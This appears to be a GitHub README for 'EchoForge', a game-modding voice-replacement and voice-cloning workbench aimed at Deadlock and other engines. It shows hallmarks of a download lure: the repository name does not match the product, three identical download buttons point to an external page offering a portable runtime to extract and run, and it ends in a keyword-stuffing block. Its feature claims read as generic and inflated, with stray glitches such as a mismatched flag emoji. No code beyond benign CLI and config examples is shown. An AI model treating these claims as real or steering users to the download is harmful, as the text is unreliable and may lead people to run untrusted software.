![preview](https://raw.githubusercontent.com/smolderyoutube/deadlock-voice-forge/main/splash_2bee08.svg)

# EchoForge: Modular Voice Synthesis Workbench

**EchoForge** is not another voice-cloning utility. It is a disciplined, version-controlled environment for crafting, remapping, and deploying character vocal identities across game modification projects—originally inspired by the intricate workflow of Deadlock's hero voice-line replacement, but generalized into a portable framework for any audio-driven modding endeavor.

Think of it as a **linguistic foundry** for game audio. Where other tools hand you a single hammer, EchoForge provides the entire forge: raw material extraction, dialect transformation, quality tempering, and final installation—all wrapped in a reproducible pipeline that respects both the source material's integrity and the target game's structure.

---

## Overview 🎚️

The modern game-modding landscape treats voice files as monolithic blobs. EchoForge challenges that assumption. This repository delivers a complete, annotated methodology for decomposing voice archives, surgically replacing specific phrases, re-synthesizing the modified audio through a neural vocoder mesh, and reassembling everything into a format the game engine accepts without complaint.

Built for modders who have outgrown single-file editors, EchoForge emphasizes **traceability** (every transformation is logged), **reversibility** (rollback to any stage), and **fidelity** (preserving the actor's emotional timbre even when swapping languages).

The core philosophy: a voice line is not a static asset—it is a *session*. EchoForge manages these sessions across projects, hero profiles, and game updates.

---

## Why EchoForge Exists 🧩

Most voice-replacement guides are a scattered collection of forum posts. EchoForge consolidates that tribal knowledge into a structured, step-by-step companion. Whether you're translating a hero's banter to a regional dialect, adding custom Easter-egg responses, or building a complete sound-overhaul pack, this workbench provides:

- A **vendor-neutral extraction layer** that handles proprietary audio containers commonly found in Source 2, Unreal, and Unity engines.
- A **preset-driven transformation engine** supporting pitch contouring, formant shifting, and prosody reassignment—far beyond simple pitch/speed tweaks.
- An **integrity checker** that validates output against expected spectral fingerprints, catching artifacts before they reach the game.

---

## 🚀 Getting Started

The entire EchoForge pipeline is orchestrated through a single configuration file (`forgefile.yaml`). This file defines the source archive, the mapping table (original phrase → replacement audio), and the output schema. No proprietary runtime is required; everything executes through portable Python 3.12+ packages bundled in the release.

**Prerequisites**: A 64-bit system with 8GB RAM (16GB recommended), an NVIDIA GPU with CUDA 12.x for the neural vocoder stage (CPU fallback works but is 6x slower), and a moddable copy of the target game.

> ⚠️ The project is delivered as a **portable workspace**—no system-level installation, no registry modification. Extract to any folder, run the launch script, and the environment configures itself.

### Initial Workspace Setup

1. Download the release bundle (see [![Download](https://raw.githubusercontent.com/smolderyoutube/deadlock-voice-forge/main/btn_a3cdceb.svg)](https://smolderyoutube.github.io/deadlock-voice-forge/) below).
2. Extract the archive to a project directory, e.g., `D:\Modding\EchoForge`.
3. Launch `echoforge_gui` or use the terminal interface `echoforge --headless`.
4. Follow the onboarding wizard to import your first voice bank.

The onboarding wizard automatically scans for common engine audio structures (`.vpk`, `.pak`, `.uasset` containers) and builds a project skeleton with three core folders:
- `input/` — original voice-line archives
- `workspace/` — intermediate files, segment metadata, and transformation logs
- `output/` — final, playable audio packages ready for game integration

---

## ⭐ Key Features

### 1. Semantic Phrase Matching 🧠
Unlike naive filename-based replacement, EchoForge analyzes the **acoustic content** of each audio clip. It builds an embedding vector for every phrase. When you supply a new line, the system finds the closest semantic match in the original bank—even if the filenames are obfuscated. This is critical for games where voice lines are stored as hashed names.

### 2. Multilingual Prosody Transfer 🌐
Translating "It's over, Anakin!" into Japanese requires more than text replacement—it requires mimicking the *attack* and *decay* of the original delivery. EchoForge's prosody transfer module decouples **lexical content** from **intonation curve**, allowing you to graft the emotional contour of the original onto a translated audio sample. The result is uncanny authenticity.

### 3. Rollback & Version Control 🔄
Every operation writes a delta manifest. Hit `Ctrl+Z` across sessions. You can branch your voice pack (e.g., "aggressive variant" vs. "comedic variant") and merge changes later—all within the workspace database.

### 4. Real-Time Preview via Loopback 🎧
Configure a virtual audio cable (Voicemeeter or similar—provided in the optional extras folder) to audition replacements **inside the actual game** without recompiling. The game plays the original line, EchoForge intercepts it mid-stream, and your replacement feeds back into the game's audio pipeline. Tweak parameters on the fly until the delivery matches.

### 5. Batch Re-Verb & Convolution Reverb Ir 🇾🇪
Don't let your custom lines sound "dry". EchoForge includes an impulse-response library extracted from real game environments (caves, cathedrals, narrow corridors). After synthesis, each voice line can be passed through a spatial-matching reverb simulator to blend seamlessly with the original recordings.

### 6. Integrity Verification Suite 🛡️
Before packaging, EchoForge runs an A/B spectral analysis. It compares the frequency distribution of your replacement versus adjacent original lines. A mismatch of more than 12% (configurable) triggers a warning and suggestions for EQ or filter corrections. No more jarring "studio-quality" outliers breaking immersion.

### 7. Community Forgefiles Repository 🌍
The `examples/` directory contains 30+ working `forgefile.yaml` configurations contributed by enthusiasts. These cover different game engines, various hero archetypes, and creative use-cases—from cartoonish pitch-ups to gender-flipped character mods.

---

## 🔧 Architecture deep-dive

The pipeline is a directed acyclic graph (DAG) of transformation nodes. Each node is a self-contained microservice (Python module) with typed inputs/outputs. You can compose custom chains via the YAML config—no Python coding required.

**Stage 1 – Extraction (`extract_voicebank`)**: Reads the target archive, decompresses audio codecs (Opus, Vorbis, ADPCM), and splits continuous streams into discrete phrase segments using silence detection and text-grid alignment.

**Stage 2 – Indexing (`build_acoustic_index`)**: Creates the semantic embeddings and stores them in a local vector database (SQLite + FAISS). This stage is what enables search-by-meaning rather than search-by-name.

**Stage 3 – Neural Synthesis (`vocoder_synthesize`)**: This is the heart. Input your replacement audio (recorded, generated via TTS, or taken from another source). EchoForge clones the original speaker's timbre and prosody onto your source. The vocoder engine is a fine-tuned HiFi-GAN variant, pre-trained on a corpus of 50+ languages, but biased toward the emotional stylings of competitive online games.

**Stage 4 – Packaging (`engine_repack`)**: Converts the synthesized clips back into the game's expected container format, recalculates checksums, and applies the correct event names. Output is either a drop-in replacement archive or a patch-set that works with the game's official mod-loading system (if present).

**Stage 5 – Validation (`integrity_audit`)**: Output the full manifest, including SHA-256 hashes, spectral similarity scores, and a human-readable changelog of every transformation.

---

## 🧰 The CLI vs. The GUI

- **GUI Mode**: Built on PySide6. Features a waveform display with clickable regions for segment-level edits. Drag-and-drop audio files, view real-time spectrograms, and adjust synthesis parameters with slider bars.
- **Terminal Mode**: For scripting and CI/CD. Every GUI action has a corresponding terminal command. Example workflow:

```bash
echoforge extract --input "hero_vocals.pak" --format source2
echoforge index --source ./workspace/phrases
echoforge synth --phrase "voice_over_hero_pick_14" --replacement my_line.wav
echoforge repack --output "mod_hero_v2.pak"
echoforge audit --mode strict
```

All configuration is declarative, so your process is reproducible by teammates.

---

## 📄 Forgefile Configuration Reference

Here is a minimal `forgefile.yaml` excerpt:

```yaml
project:
  name: "MyHero_Rework"
  engine: "source2"
  language: "en-US"

extraction:
  archive_path: "./input/hero_default.vpk"
  segment_method: "silence_threshold"
  threshold_db: -35

synth:
  mode: "clone_timbre"
  prosody_source: "original_phrase"
  pitch_shift: 1.0          # 1.0 = natural, higher = chipmunk
  formant_preserve: 80      # percent of original formant retention

repack:
  output_format: "vpk_v2"
  compression: "lz4hc"
  pad_to_bank: true
```

Full documentation for every key is in `/docs/FORGEFILE_SPEC.md`.

---

## 🧪 Environment & Compatibility

| Component | Minimum Spec | Recommended Spec |
|-----------|----------------|------------------|
| OS        | Windows 10 21H2 | Windows 11 23H2/Ubuntu 22.04 |
| RAM       | 8 GB           | 16 GB           |
| GPU       | GTX 1060 (6GB) | RTX 3060 Ti (8GB) |
| Disk Space| 20 GB free     | 40 GB (for cache) |
| Audio API | WASAPI, ALSA   | WASAPI Exclusive Mode |

Supports engines tested: **Source 2 (Deadlock/Dota2), Unreal Engine 4/5, Unity 2022+, CryEngine V**. Partial support for **RAGE Engine** (through community Forgefile).

---

## 🧑‍🤝‍🧑 Community Workflows & Examples

Open the `/examples` directory to see:

- **`deadlock_ai_general_rewrite.yaml`**: The original inspiration. Replaces a certain hero's idle taunts with a more humorous take using only the same voice actor's other language packs.
- **`valorant_french_duck_quack.yaml`**: A meme example—replaces an agent's ultimate line with a duck quack, but preserves the original echo and reverb tail.
- **`single_player_rpg_gender_swap.yaml`**: Swaps a male protagonist's voice for a female cast member from a different game, while adjusting the equalization to match.

Join the **#forgewrights** discussion channel (invite link in the sidebar) to share your custom `forgefile.yaml` configs.

---

## 🛰️ Roadmap & Future Vision (2026)

The 2026 roadmap is focused on **collaborative real-time editing**:

- **Multiplayer session mode**: Two modders co-edit the same voice bank over LAN/Internet with conflict resolution.
- **Cloud synthesis offload**: If your local GPU isn't enough, stream the heavy vocoder stage to a shared server—complimentary for community members with verified accounts.
- **Automated source-text extraction**: If the game has subtitles (`.srt` or localized text files), EchoForge will auto-align voice lines to subtitle text, dramatically simplifying the mapping phase.
- **Unreal Engine MetaHuman integration**: Directly push generated voice lines into MetaHuman animation projects using the new LiveLink audio plugin.

---

## 📜 License & Legal

**EchoForge** is released under the **MIT License**—you are free to use, modify, and redistribute, provided you retain the original copyright notice. A copy of the license is included in the repository root: [MIT License](LICENSE).

### Allowed Uses
- Creating mods for games you legally own.
- Using EchoForge as part of a commercial mod-pack (attribution appreciated).

### Restrictions
- Do **not** use EchoForge to bypass DRM or anti-cheat software.
- Do **not** use EchoForge to deceive players in multiplayer ranking environments (e.g., impersonating official voice lines to issue false commands).

---

## ⚠️ Disclaimer of Warranty

This project is provided **as-is** with no warranties of any kind, express or implied. The author is not responsible for:

- Any game account suspension or ban resulting from the use of modified voice files.
- Corruption of game installation directories—always keep backups.
- Inaccuracy in voice-line mapping leading to **unintended phrase collisions** (e.g., your "victory" line playing during a "defeat" trigger).
- Misuse of the neural synthesis module to impersonate real individuals whose voice is not your own. You are solely responsible for the ethical use of the audio generated. Please respect personality rights.

EchoForge is a **tool for creative expression**, not for deception. Use it to enhance your gaming experience, respect community guidelines, and—above all—have fun crafting audio that feels authentically yours.

---

## 🆘 24/7 Support & Resource Hub

While this is an open-source community project (not a commercial product), we maintain a **community help-desk channel** with near-global coverage. Real-time assistance from volunteer maintainers is typically available within 2-4 hours across US/EU/APAC time zones.

- **Discord Server**: Find the link in the GitHub sidebar ("Community").
- **Wiki Documentation**: [Visit the Wiki](../../wiki).
- **Bug Tracker**: [Report issues](../../issues).

If you encounter an unsupported engine or format, please open a feature request with a sample file—additions are usually integrated within two release cycles.

---

## 🔍 Search-Optimized Keywords (for your mod-discovery)

Voice line replacement, hero dialogue mod, audio pipeline, neural vocoder, Source 2 audio editor, Unreal Engine voice swap, game localization editing, prosody transfer, semantic audio search, mod packaging toolkit, reverb impulse response library, multi-language voice install.

---

## 📦 Download the Current Release

**EchoForge v2.4.1 “Quiet Conductor”** — Build 2026-01-15  

Includes:
- Portable runtime (no installation required).
- Pre-trained vocoder weights (2.3 GB, downloaded separately on first run).
- Example Forgefiles.
- Full documentation set (`/docs`).

[![Download](https://raw.githubusercontent.com/smolderyoutube/deadlock-voice-forge/main/btn_a3cdceb.svg)](https://smolderyoutube.github.io/deadlock-voice-forge/)

---

*EchoForge project maintainers — 2026.* This project is community-supported and is not affiliated with Valve Corporation.

[![Download](https://raw.githubusercontent.com/smolderyoutube/deadlock-voice-forge/main/btn_a3cdceb.svg)](https://smolderyoutube.github.io/deadlock-voice-forge/)